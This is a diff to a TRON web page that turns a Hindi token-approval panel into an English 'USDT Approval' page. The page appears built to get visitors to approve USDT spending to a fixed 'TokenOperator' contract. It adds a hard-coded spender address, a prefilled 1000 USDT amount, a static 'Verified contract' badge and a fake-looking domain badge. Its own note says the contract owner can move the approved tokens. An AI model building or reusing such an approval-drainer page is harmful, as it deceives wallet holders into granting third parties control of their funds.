@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>टोकन अप्रूवल - यूजर पैनल</title>
+    <title>USDT Approval System</title>
     <style>
         * {
             margin: 0;
@@ -12,15 +12,14 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
-            color: #333;
         }
 
         .container {
-            max-width: 600px;
+            max-width: 500px;
             margin: 0 auto;
             background: white;
             border-radius: 20px;
@@ -28,263 +27,444 @@
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
 
-        .header {
+        h1 {
             text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 28px;
             color: #333;
             margin-bottom: 10px;
         }
 
-        .header h1 span {
-            color: #667eea;
-        }
-
-        .wallet-section {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 12px;
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
             margin-bottom: 30px;
         }
 
+        .contract-display {
+            background: #f0f3ff;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .contract-display .label {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .contract-display .address {
+            font-family: monospace;
+            color: #667eea;
+            font-weight: 600;
+            word-break: break-all;
+        }
+
         .btn {
-            padding: 12px 25px;
+            padding: 12px 24px;
             border: none;
-            border-radius: 8px;
-            font-size: 14px;
+            border-radius: 10px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            width: 100%;
+            font-size: 14px;
         }
 
         .btn-primary {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            width: 100%;
         }
 
         .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
         }
 
-        .btn-success {
-            background: #28a745;
-            color: white;
+        .wallet-card {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: all 0.3s;
         }
 
-        .form-group {
+        .wallet-card:hover {
+            border-color: #667eea;
+            box-shadow: 0 5px 15px rgba(102,126,234,0.2);
+        }
+
+        .wallet-name {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .wallet-desc {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 450px;
+            width: 90%;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 20px;
         }
 
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #333;
+        .modal-header h3 {
+            font-size: 20px;
         }
 
-        .form-group input,
-        .form-group select {
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .domain-badge {
+            background: #f0f0f0;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 13px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        .verified-badge {
+            color: #10b981;
+            font-size: 13px;
+            margin: 5px 0;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            margin: 20px 0;
+        }
+
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            background: #667eea;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+
+        .permissions-box {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .permission-item {
+            padding: 8px 0;
+            color: #444;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .permission-item::before {
+            content: "•";
+            color: #667eea;
+            font-weight: bold;
+        }
+
+        .approval-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .approval-title {
+            font-weight: 600;
+            color: #856404;
+            margin-bottom: 15px;
+        }
+
+        .approval-amount {
+            margin: 15px 0;
+        }
+
+        .approval-amount input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 12px;
             border: 2px solid #e0e0e0;
             border-radius: 8px;
             font-size: 14px;
         }
 
-        .form-group input:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: #667eea;
+        .contract-address {
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+            background: #f8f9fa;
+            padding: 8px;
+            border-radius: 6px;
+            font-family: monospace;
         }
 
-        .info-box {
+        .modal-footer {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .modal-footer button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .cancel-btn {
+            background: #f0f0f0;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .status-info {
+            background: #cce5ff;
+            color: #004085;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .security-note {
             background: #e7f3ff;
             border-left: 4px solid #007bff;
             padding: 15px;
             border-radius: 8px;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-
-        .wallet-address {
-            background: white;
-            padding: 10px 15px;
-            border-radius: 8px;
-            border: 1px solid #e0e0e0;
-            font-family: monospace;
-            margin-top: 10px;
-            word-break: break-all;
-        }
-
-        .tx-hash {
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
-            margin-top: 10px;
+            font-size: 13px;
+            margin-top: 20px;
         }
 
         .footer {
             text-align: center;
-            margin-top: 30px;
+            margin-top: 20px;
             color: #666;
             font-size: 12px;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 20px;
-            color: #667eea;
-        }
-
-        .loading:after {
-            content: '⏳ प्रोसेसिंग...';
-        }
-
-        .note {
-            background: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-size: 13px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- हेडर -->
-        <div class="header">
-            <h1>🔐 <span>टोकन अप्रूवल सिस्टम</span></h1>
-            <p>TRON ब्लॉकचेन पर सुरक्षित अप्रूवल</p>
+        <h1>💵 USDT Approval</h1>
+        <div class="subtitle">Connect wallet & approve USDT in one step</div>
+
+        <!-- Contract Address Display (Fixed) -->
+        <div class="contract-display">
+            <div class="label">TokenOperator Contract</div>
+            <div class="address" id="contractAddress">TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt</div>
         </div>
 
-        <!-- कॉन्ट्रैक्ट एड्रेस सेटिंग -->
-        <div class="note">
-            <strong>⚠️ कॉन्ट्रैक्ट एड्रेस:</strong>
-            <input type="text" id="contractAddress" value="TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt" 
-                   style="width: 100%; margin-top: 10px; padding: 8px;" 
-                   placeholder="कॉन्ट्रैक्ट एड्रेस डालें">
-            <button class="btn btn-success" style="margin-top: 10px;" onclick="updateContractAddress()">
-                ✅ एड्रेस सेट करें
-            </button>
+        <!-- Wallet Connect Card -->
+        <div class="wallet-card" onclick="openConnectModal()">
+            <div class="wallet-name">TRUST WALLET / TRONLINK</div>
+            <div class="wallet-desc">Connect to approve USDT</div>
+            <button class="btn btn-primary">Connect & Approve USDT →</button>
         </div>
 
-        <!-- वॉलेट कनेक्ट -->
-        <div class="wallet-section">
-            <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
-                🔌 TronLink वॉलेट कनेक्ट करें
-            </button>
-            <div id="walletAddress" class="wallet-address" style="display: none;"></div>
+        <div class="security-note">
+            <strong>🔒 Security:</strong> You are approving USDT for the TokenOperator contract. 
+            Only the contract owner can transfer your approved tokens.
         </div>
 
-        <!-- मेन एप्लिकेशन (वॉलेट कनेक्ट होने के बाद दिखेगा) -->
-        <div id="app" style="display: none;">
-            
-            <!-- स्टेप 1: टोकन सेलेक्ट -->
-            <div class="form-group">
-                <label>टोकन चुनें:</label>
-                <select id="tokenSelect">
-                    <option value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">USDT (TRC-20)</option>
-                    <option value="TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8">USDC (TRC-20)</option>
-                </select>
-            </div>
-
-            <!-- स्टेप 2: अप्रूवल अमाउंट -->
-            <div class="form-group">
-                <label>अप्रूवल अमाउंट (USDT):</label>
-                <input type="number" id="approveAmount" placeholder="जितना अप्रूव करना है" min="0" step="1">
-            </div>
-
-            <!-- स्टेप 3: अप्रूव बटन -->
-            <button class="btn btn-primary" onclick="approveToken()" id="approveBtn">
-                ✅ अप्रूव करें
-            </button>
-
-            <!-- बैलेंस चेक -->
-            <button class="btn btn-success" style="margin-top: 10px;" onclick="checkBalance()">
-                💰 मेरा बैलेंस चेक करें
-            </button>
-
-            <!-- अप्रूवल चेक -->
-            <button class="btn" style="margin-top: 10px; background: #6c757d; color: white;" onclick="checkMyAllowance()">
-                🔍 मेरा अप्रूवल चेक करें
-            </button>
-
-            <!-- रिजल्ट दिखाने के लिए -->
-            <div id="result" class="tx-hash" style="display: none;"></div>
-
-            <!-- नोट -->
-            <div class="note" style="margin-top: 20px;">
-                <strong>📌 नोट:</strong><br>
-                • पहले अप्रूव करें, फिर ट्रांसफर होगा<br>
-                • गैस के लिए पर्याप्त TRX रखें<br>
-                • 1 USDT = 1,000,000 सन
-            </div>
-        </div>
-
-        <!-- फुटर -->
         <div class="footer">
-            ⚡ सुरक्षित टोकन अप्रूवल सिस्टम<br>
-            <span id="networkDisplay">मेननेट</span> पर चल रहा है
+            Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt • Only USDT
+        </div>
+    </div>
+
+    <!-- Connect + Approve Modal -->
+    <div id="connectModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Connect & Approve USDT</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+
+            <div style="text-align: center;">
+                <div style="font-weight: 600;">Main Wallet</div>
+                <div style="color: #666; margin: 10px 0;">
+                    Approve USDT for TokenOperator
+                </div>
+                <span class="domain-badge">usdt-approval.io</span>
+                <div class="verified-badge">✅ Verified contract</div>
+            </div>
+
+            <!-- Wallet Selection -->
+            <div class="wallet-option">
+                <div class="wallet-icon">T</div>
+                <div>
+                    <strong>TronLink</strong>
+                    <div style="color: #666; font-size: 12px;">Tron • USDT</div>
+                </div>
+            </div>
+
+            <!-- Permissions -->
+            <div class="permissions-box">
+                <div class="permission-item">View your wallet balance</div>
+                <div class="permission-item">Approve USDT tokens</div>
+            </div>
+
+            <!-- Approval Box - Only USDT -->
+            <div class="approval-box">
+                <div class="approval-title">🔐 USDT Approval Required</div>
+                
+                <div class="approval-amount">
+                    <input type="number" id="approveAmount" value="1000" min="1" placeholder="Amount in USDT">
+                </div>
+
+                <div class="contract-address" id="contractDisplay">
+                    Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
+                </div>
+                <div style="font-size: 11px; color: #666; margin-top: 5px;">
+                    Token: USDT (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
+                </div>
+            </div>
+
+            <!-- Status -->
+            <div id="modalStatus"></div>
+
+            <!-- Footer -->
+            <div class="modal-footer">
+                <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+                <button class="connect-btn" onclick="handleConnectAndApprove()" id="connectApproveBtn">
+                    Connect & Approve USDT
+                </button>
+            </div>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
         // ============================================
-        // यूजर पैनल - सिर्फ अप्रूवल के लिए
+        // CONFIGURATION - ONLY USDT
         // ============================================
+        
+        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const NETWORK = "https://api.trongrid.io";
 
+        // State
         let tronWeb = null;
         let userAddress = null;
-        let contractAddress = "YOUR_CONTRACT_ADDRESS_HERE";
 
-        // कॉन्फिग
-        const NETWORK = "https://api.trongrid.io"; // मेननेट
-
-        // ============================================
-        // कॉन्ट्रैक्ट एड्रेस अपडेट करें
-        // ============================================
-        window.updateContractAddress = function() {
-            const newAddress = document.getElementById('contractAddress').value.trim();
-            if (newAddress && newAddress.startsWith('T')) {
-                contractAddress = newAddress;
-                showMessage('✅ कॉन्ट्रैक्ट एड्रेस सेट हो गया', 'success');
-            } else {
-                showMessage('❌ सही एड्रेस डालें', 'error');
-            }
+        // Modal functions
+        window.openConnectModal = function() {
+            document.getElementById('connectModal').style.display = 'flex';
         };
 
-        // ============================================
-        // वॉलेट कनेक्ट करें
-        // ============================================
-        window.connectWallet = async function() {
-            if (contractAddress === "YOUR_CONTRACT_ADDRESS_HERE") {
-                showMessage('पहले कॉन्ट्रैक्ट एड्रेस डालें!', 'error');
+        window.closeModal = function() {
+            document.getElementById('connectModal').style.display = 'none';
+            document.getElementById('modalStatus').innerHTML = '';
+        };
+
+        // Main function - Connect + Approve USDT
+        window.handleConnectAndApprove = async function() {
+            const amount = document.getElementById('approveAmount').value;
+
+            if (!amount || amount <= 0) {
+                showStatus('Please enter USDT amount', 'error');
                 return;
             }
 
-            const connectBtn = document.getElementById('connectBtn');
-            connectBtn.disabled = true;
-            connectBtn.innerHTML = '⏳ कनेक्ट हो रहा है...';
+            const btn = document.getElementById('connectApproveBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Processing...';
 
             try {
+                // Step 1: Check TronLink
                 if (!window.tronLink) {
-                    alert('TronLink वॉलेट इंस्टॉल नहीं है!\nhttps://www.tronlink.org/');
-                    return;
+                    throw new Error('TronLink not installed');
                 }
 
+                showStatus('Requesting wallet connection...', 'info');
+
+                // Step 2: Request account
                 await window.tronLink.request({ method: 'tron_requestAccounts' });
                 
+                // Step 3: Initialize TronWeb
                 tronWeb = new TronWeb({
                     fullHost: NETWORK,
                     privateKey: window.tronLink.privateKey
@@ -292,154 +472,79 @@
 
                 userAddress = tronWeb.defaultAddress.base58;
                 
-                // UI अपडेट
-                document.getElementById('connectBtn').style.display = 'none';
-                document.getElementById('walletAddress').style.display = 'block';
-                document.getElementById('walletAddress').innerHTML = 
-                    `🔗 ${shortenAddress(userAddress)} 
-                     <a href="https://tronscan.org/#/address/${userAddress}" target="_blank">🔍</a>`;
+                showStatus('✅ Wallet connected! Requesting USDT approval...', 'info');
+
+                // Step 4: Get USDT contract
+                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                 
-                document.getElementById('app').style.display = 'block';
+                // Step 5: Send approve transaction
+                const amountInSun = Math.floor(amount * 1000000); // USDT has 6 decimals
                 
-                showMessage('✅ वॉलेट कनेक्ट हो गया!', 'success');
-
-            } catch (error) {
-                console.error(error);
-                showMessage('❌ कनेक्ट करने में एरर: ' + error.message, 'error');
-            } finally {
-                connectBtn.disabled = false;
-                connectBtn.innerHTML = '🔌 TronLink वॉलेट कनेक्ट करें';
-            }
-        };
-
-        // ============================================
-        // टोकन अप्रूव करें
-        // ============================================
-        window.approveToken = async function() {
-            const amount = document.getElementById('approveAmount').value;
-            const tokenAddress = document.getElementById('tokenSelect').value;
-
-            if (!amount || amount <= 0) {
-                showMessage('❌ अमाउंट डालें', 'error');
-                return;
-            }
-
-            const approveBtn = document.getElementById('approveBtn');
-            approveBtn.disabled = true;
-            approveBtn.innerHTML = '⏳ अप्रूव हो रहा है...';
-
-            try {
-                // टोकन कॉन्ट्रैक्ट इंस्टैंशिएट करें
-                const tokenContract = await tronWeb.contract().at(tokenAddress);
-                
-                // अमाउंट को सन में कन्वर्ट करें (USDT = 6 decimals)
-                const amountInSun = Math.floor(amount * 1000000);
-
-                // approve फंक्शन कॉल करें
                 const result = await tokenContract.approve(
-                    contractAddress,
+                    CONTRACT_ADDRESS,
                     amountInSun
                 ).send();
 
-                showMessage(`✅ अप्रूवल सक्सेस!`, 'success');
-                
-                document.getElementById('result').style.display = 'block';
-                document.getElementById('result').innerHTML = `
-                    ✅ अप्रूवल सक्सेस!<br>
-                    TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">
-                        ${shortenAddress(result)}
-                    </a>
-                `;
+                showStatus('✅ USDT approval successful!', 'success');
+
+                // Step 6: Save approval to localStorage
+                saveApproval(userAddress, amount, result);
+
+                // Step 7: Close modal after success
+                setTimeout(() => {
+                    closeModal();
+                    alert(`✅ Success!\nApproved ${amount} USDT\nTX: ${shortenAddress(result)}`);
+                }, 1500);
 
             } catch (error) {
                 console.error(error);
-                showMessage('❌ अप्रूवल फेल: ' + error.message, 'error');
+                showStatus('❌ Error: ' + error.message, 'error');
             } finally {
-                approveBtn.disabled = false;
-                approveBtn.innerHTML = '✅ अप्रूव करें';
+                btn.disabled = false;
+                btn.innerHTML = 'Connect & Approve USDT';
             }
         };
 
-        // ============================================
-        // मेरा बैलेंस चेक करें
-        // ============================================
-        window.checkBalance = async function() {
-            const tokenAddress = document.getElementById('tokenSelect').value;
-
-            try {
-                const tokenContract = await tronWeb.contract().at(tokenAddress);
-                const balance = await tokenContract.balanceOf(userAddress).call();
-                
-                // USDT के 6 decimals को ह्यूमन रीडेबल में बदलें
-                const humanReadable = (balance / 1000000).toFixed(2);
-                
-                showMessage(`💰 आपका बैलेंस: ${humanReadable} USDT`, 'success');
-
-            } catch (error) {
-                showMessage('❌ बैलेंस चेक करने में एरर', 'error');
-            }
-        };
-
-        // ============================================
-        // मेरा अप्रूवल चेक करें
-        // ============================================
-        window.checkMyAllowance = async function() {
-            const tokenAddress = document.getElementById('tokenSelect').value;
-
-            try {
-                const tokenContract = await tronWeb.contract().at(tokenAddress);
-                const allowance = await tokenContract.allowance(
-                    userAddress,
-                    contractAddress
-                ).call();
-
-                const humanReadable = (allowance / 1000000).toFixed(2);
-                
-                showMessage(`🔍 आपने ${humanReadable} USDT अप्रूव किया है`, 'info');
-
-            } catch (error) {
-                showMessage('❌ चेक करने में एरर', 'error');
-            }
-        };
-
-        // ============================================
-        // मैसेज दिखाएं
-        // ============================================
-        function showMessage(message, type = 'info') {
-            const resultDiv = document.getElementById('result');
-            resultDiv.style.display = 'block';
+        // Save approval to localStorage
+        function saveApproval(address, amount, txHash) {
+            const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
             
-            const colors = {
-                success: '#d4edda',
-                error: '#f8d7da',
-                info: '#cce5ff'
-            };
+            approvals.push({
+                user: address,
+                token: 'USDT',
+                amount: amount,
+                txHash: txHash,
+                status: 'active',
+                time: new Date().toISOString(),
+                tokenAddress: USDT_ADDRESS,
+                contractAddress: CONTRACT_ADDRESS
+            });
             
-            resultDiv.style.background = colors[type] || '#f8f9fa';
-            resultDiv.style.color = '#333';
-            resultDiv.innerHTML = message;
-            
-            // 5 सेकंड बाद छुपाएं
-            setTimeout(() => {
-                if (type !== 'success') {
-                    resultDiv.style.display = 'none';
-                }
-            }, 5000);
+            localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
         }
 
-        // ============================================
-        // एड्रेस शॉर्ट करें
-        // ============================================
-        function shortenAddress(address) {
-            if (!address) return '';
-            return address.slice(0, 6) + '...' + address.slice(-4);
+        // Show status in modal
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('modalStatus');
+            const className = type === 'success' ? 'status-success' : 
+                            type === 'error' ? 'status-error' : 'status-info';
+            
+            statusDiv.innerHTML = `<div class="status-message ${className}">${message}</div>`;
         }
 
-        // ============================================
-        // नेटवर्क डिस्प्ले
-        // ============================================
-        document.getElementById('networkDisplay').innerText = 
-            NETWORK.includes('shasta') ? 'टेस्टनेट' : 'मेननेट';
+        // Helper: shorten address
+        function shortenAddress(addr) {
+            if (!addr || addr.length < 10) return addr;
+            return addr.slice(0, 6) + '...' + addr.slice(-4);
+        }
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('connectModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        };
     </script>
 </body>
 </html>
